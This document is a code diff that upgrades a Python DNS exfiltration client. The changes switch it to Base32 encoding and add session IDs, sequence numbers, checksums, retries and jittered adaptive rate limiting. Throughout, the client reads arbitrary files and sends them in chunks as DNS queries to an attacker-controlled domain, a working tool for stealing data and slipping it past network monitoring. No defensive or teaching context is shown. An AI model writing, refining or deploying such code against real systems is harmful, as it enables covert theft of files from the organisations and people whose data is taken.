@@ -1,14 +1,20 @@
 #!/usr/bin/env python3
 
 import argparse
-import base64
 import os
+import random
 import time
-from typing import List
+from typing import List, Dict, Optional
 
 import dns.resolver
 
 from config import ServerConfig, load_config
+from encoding_utils import (
+    encode_base32_no_padding,
+    generate_session_id,
+    calculate_checksum,
+    is_valid_base32,
+)
 from logger import setup_logger
 
 
@@ -16,14 +22,16 @@ class DNSExfiltrationClient:
     """
     DNS exfiltration client.
 
-    The client reads a file as bytes, base64-encodes it, and sends it in
+    The client reads a file as bytes, Base32-encodes it, and sends it in
     fixed-size chunks using DNS A queries with the following label format:
 
-        NNN-<base64_chunk>.<domain>
+        <session>-<seq>-<chunk>-<checksum>.<domain>
 
     where:
-    - NNN is a zero-padded chunk ID (000, 001, 002, ...)
-    - <base64_chunk> is a slice of the base64-encoded file contents
+    - <session> is a 6-character Base32 session ID
+    - <seq> is a 4-digit zero-padded sequence number (0000-9999)
+    - <chunk> is a slice of the Base32-encoded file contents (40-50 chars)
+    - <checksum> is a 3-character Base32 checksum
     - <domain> is the user-supplied domain/zone handled by the exfiltration server
     """
 
@@ -37,20 +45,34 @@ class DNSExfiltrationClient:
         # Single resolver instance reused for all queries.
         self.resolver = dns.resolver.Resolver()
 
-        # We only control the left-most label (NNN-<chunk>); the domain is a
-        # separate label, so the only hard limit here is 63 chars for the
-        # whole leading label.
-        #
-        # Reserve 3 chars for the zero-padded ID and 1 for the hyphen.
-        max_chunk_by_label = self._DNS_LABEL_MAX_LEN - 4
-
-        # Respect configured max_chunk_size but never exceed DNS label limits.
-        self.chunk_size = min(max_chunk_by_label, self.config.max_chunk_size)
+        # Calculate chunk size based on new format
+        # Format: <session>-<seq>-<chunk>-<checksum>
+        # Overhead: session_len + seq_len + checksum_len + 3 hyphens
+        overhead = (
+            self.config.session_id_length
+            + 4  # sequence number (4 digits)
+            + self.config.checksum_length
+            + 3  # 3 hyphens
+        )
+        max_chunk_size = self._DNS_LABEL_MAX_LEN - overhead
+        
+        # Use configured chunk_size but ensure it fits
+        self.chunk_size = min(max_chunk_size, self.config.chunk_size)
+        if self.chunk_size < 40:
+            self.chunk_size = 40
+            self.logger.warning(
+                f"Chunk size adjusted to minimum 40 characters "
+                f"(calculated max: {max_chunk_size})"
+            )
 
         self.total_sent = 0
-
-        # Simple per-chunk delay to respect rate_limit (requests/minute).
-        self.rate_limit_delay = 60 / config.rate_limit
+        self.session_id: Optional[str] = None
+        
+        # Rate control state
+        self.current_rate = config.base_rate_limit
+        self.consecutive_errors = 0
+        self.last_query_time = 0.0
+        self.response_times: List[float] = []
 
     def setup_resolver(self, nameservers: List[str], port: int) -> None:
         """Configure the DNS resolver with the specified nameservers and port."""
@@ -76,16 +98,65 @@ class DNSExfiltrationClient:
 
     def chunk_data(self, raw_bytes: bytes) -> List[str]:
         """
-        Base64-encode the raw bytes and split them into fixed-size chunks.
+        Base32-encode the raw bytes and split them into fixed-size chunks.
 
-        The chunks are ASCII strings safe to embed in a DNS label, and their
-        size is already capped by DNS label constraints.
+        The chunks are Base32 strings (no padding) safe to embed in a DNS label.
         """
-        encoded_data = base64.b64encode(raw_bytes).decode("ascii")
+        encoded_data = encode_base32_no_padding(raw_bytes)
         return [
             encoded_data[i : i + self.chunk_size]
             for i in range(0, len(encoded_data), self.chunk_size)
         ]
+
+    def _calculate_delay(self) -> float:
+        """
+        Calculate delay between queries with adaptive rate control and jitter.
+        
+        Returns:
+            Delay in seconds
+        """
+        base_delay = 60.0 / self.current_rate
+        
+        # Add exponential backoff if there are consecutive errors
+        if self.consecutive_errors > 0:
+            backoff_multiplier = min(2.0 ** self.consecutive_errors, 16.0)
+            base_delay *= backoff_multiplier
+        
+        # Add jitter if enabled (up to 20% of base delay)
+        if self.config.enable_jitter:
+            jitter = random.uniform(-0.1, 0.1) * base_delay
+            base_delay += jitter
+        
+        return max(0.01, base_delay)  # Minimum 10ms delay
+
+    def _update_rate(self, response_time: float) -> None:
+        """
+        Update rate based on response time (adaptive rate control).
+        
+        Args:
+            response_time: Time taken for DNS query in seconds
+        """
+        if not self.config.enable_adaptive_rate:
+            return
+        
+        self.response_times.append(response_time)
+        # Keep only last 10 response times
+        if len(self.response_times) > 10:
+            self.response_times.pop(0)
+        
+        avg_response_time = sum(self.response_times) / len(self.response_times)
+        
+        # If response time is high, reduce rate; if low, increase rate
+        if avg_response_time > 1.0:  # Slow responses
+            self.current_rate = max(
+                self.config.base_rate_limit * 0.5,
+                self.current_rate * 0.9
+            )
+        elif avg_response_time < 0.1:  # Fast responses
+            self.current_rate = min(
+                self.config.max_rate_limit,
+                self.current_rate * 1.1
+            )
 
     def validate_file(self, file_path: str) -> None:
         """Validate the input file."""
@@ -99,58 +170,120 @@ class DNSExfiltrationClient:
                 f"({self.config.max_total_size} bytes)"
             )
 
-    def send_chunk(self, chunk_id: int, chunk: str, domain: str) -> bool:
-        """Send a single chunk of data via DNS query."""
-        try:
-            # Ensure the chunk ID doesn't make the label too long
-            chunk_id_str = str(chunk_id).zfill(3)  # Pad with zeros to ensure consistent length
-            query_name = f"{chunk_id_str}-{chunk}.{domain}"
+    def send_chunk(
+        self, chunk_id: int, chunk: str, domain: str, max_retries: int = 3
+    ) -> bool:
+        """
+        Send a single chunk of data via DNS query with retry logic.
+        
+        Args:
+            chunk_id: Sequence number of the chunk
+            chunk: Base32-encoded chunk data
+            domain: Domain name for the query
+            max_retries: Maximum number of retry attempts
+            
+        Returns:
+            True if chunk was sent successfully, False otherwise
+        """
+        if not self.session_id:
+            self.session_id = generate_session_id(self.config.session_id_length)
+            self.logger.info(f"Generated session ID: {self.session_id}")
+        
+        # Calculate checksum for this chunk
+        checksum = calculate_checksum(chunk, self.config.checksum_length)
+        
+        # Format: <session>-<seq>-<chunk>-<checksum>
+        seq_str = str(chunk_id).zfill(4)
+        label = f"{self.session_id}-{seq_str}-{chunk}-{checksum}"
+        query_name = f"{label}.{domain}"
 
-            # Verify the label length (safety check; chunk_size should already enforce this).
-            label_len = len(f"{chunk_id_str}-{chunk}")
-            if label_len > self._DNS_LABEL_MAX_LEN:
-                self.logger.error(
-                    f"Chunk {chunk_id} label too long: {label_len} characters "
-                    f"(max {self._DNS_LABEL_MAX_LEN})"
-                )
-                return False
+        # Verify the label length
+        if len(label) > self._DNS_LABEL_MAX_LEN:
+            self.logger.error(
+                f"Chunk {chunk_id} label too long: {len(label)} characters "
+                f"(max {self._DNS_LABEL_MAX_LEN})"
+            )
+            return False
 
-            self.logger.debug(f"Sending chunk {chunk_id} to {query_name}")
+        # Validate Base32 characters
+        if not is_valid_base32(chunk):
+            self.logger.error(f"Chunk {chunk_id} contains invalid Base32 characters")
+            return False
 
+        # Rate limiting: wait if needed
+        if self.last_query_time > 0:
+            elapsed = time.time() - self.last_query_time
+            delay = self._calculate_delay()
+            if elapsed < delay:
+                time.sleep(delay - elapsed)
+
+        # Retry loop
+        for attempt in range(max_retries + 1):
             try:
-                # We do not care about the content of the answer, only that the
-                # query was successfully sent/processed (or NXDOMAIN/NoAnswer).
+                start_time = time.time()
+                self.logger.debug(f"Sending chunk {chunk_id} (attempt {attempt + 1}) to {query_name}")
+
+                # Send DNS query
                 self.resolver.resolve(query_name, "A")
+                
+                # Success
+                response_time = time.time() - start_time
+                self._update_rate(response_time)
+                self.consecutive_errors = 0
+                self.last_query_time = time.time()
                 self.total_sent += len(chunk)
                 self.logger.info(f"Successfully sent chunk {chunk_id}")
-                time.sleep(self.rate_limit_delay)
                 return True
+                
             except dns.resolver.NXDOMAIN:
+                # NXDOMAIN is acceptable - server received the query
+                response_time = time.time() - start_time
+                self._update_rate(response_time)
+                self.consecutive_errors = 0
+                self.last_query_time = time.time()
                 self.total_sent += len(chunk)
                 self.logger.info(f"Successfully sent chunk {chunk_id} (NXDOMAIN response)")
-                time.sleep(self.rate_limit_delay)
                 return True
+                
             except dns.resolver.NoAnswer:
+                # NoAnswer is acceptable - server received the query
+                response_time = time.time() - start_time
+                self._update_rate(response_time)
+                self.consecutive_errors = 0
+                self.last_query_time = time.time()
                 self.total_sent += len(chunk)
                 self.logger.info(f"Successfully sent chunk {chunk_id} (NoAnswer response)")
-                time.sleep(self.rate_limit_delay)
                 return True
+                
             except Exception as e:
-                self.logger.error(f"DNS query failed for chunk {chunk_id}: {e}")
-                return False
+                self.consecutive_errors += 1
+                if attempt < max_retries:
+                    retry_delay = self._calculate_delay() * (attempt + 1)
+                    self.logger.warning(
+                        f"DNS query failed for chunk {chunk_id} (attempt {attempt + 1}): {e}. "
+                        f"Retrying in {retry_delay:.2f}s..."
+                    )
+                    time.sleep(retry_delay)
+                else:
+                    self.logger.error(
+                        f"DNS query failed for chunk {chunk_id} after {max_retries + 1} attempts: {e}"
+                    )
+                    return False
 
-        except Exception as e:
-            self.logger.error(f"Failed to send chunk {chunk_id}: {e}")
-            return False
+        return False
 
     def exfiltrate_file(self, file_path: str, domain: str) -> bool:
         """
-        Exfiltrate a file through DNS queries.
+        Exfiltrate a file through DNS queries using Base32 encoding.
 
         Returns True if all chunks were sent successfully, False otherwise.
         """
         try:
             self.validate_file(file_path)
+
+            # Generate session ID for this transfer
+            self.session_id = generate_session_id(self.config.session_id_length)
+            self.logger.info(f"Starting exfiltration with session ID: {self.session_id}")
 
             # Read as bytes so arbitrary binary files are supported.
             with open(file_path, "rb") as file:
@@ -160,20 +293,32 @@ class DNSExfiltrationClient:
 
             self.logger.info(
                 f"Starting exfiltration of {file_path} "
-                f"({len(chunks)} chunks, {len(file_bytes)} bytes raw)"
+                f"(session: {self.session_id}, {len(chunks)} chunks, "
+                f"{len(file_bytes)} bytes raw, chunk size: {self.chunk_size} chars)"
             )
 
             success_count = 0
+            failed_chunks: List[int] = []
+            
             for i, chunk in enumerate(chunks):
                 if self.send_chunk(i, chunk, domain):
                     success_count += 1
-                    self.logger.info(f"Progress: {success_count}/{len(chunks)} chunks sent")
+                    if success_count % 10 == 0 or success_count == len(chunks):
+                        self.logger.info(
+                            f"Progress: {success_count}/{len(chunks)} chunks sent "
+                            f"({(success_count/len(chunks)*100):.1f}%)"
+                        )
+                else:
+                    failed_chunks.append(i)
 
             success_rate = (success_count / len(chunks)) * 100
             self.logger.info(
                 f"Exfiltration complete. Success rate: {success_rate:.2f}% "
                 f"({success_count}/{len(chunks)} chunks)"
             )
+            
+            if failed_chunks:
+                self.logger.warning(f"Failed chunks: {failed_chunks}")
 
             return success_count == len(chunks)
 
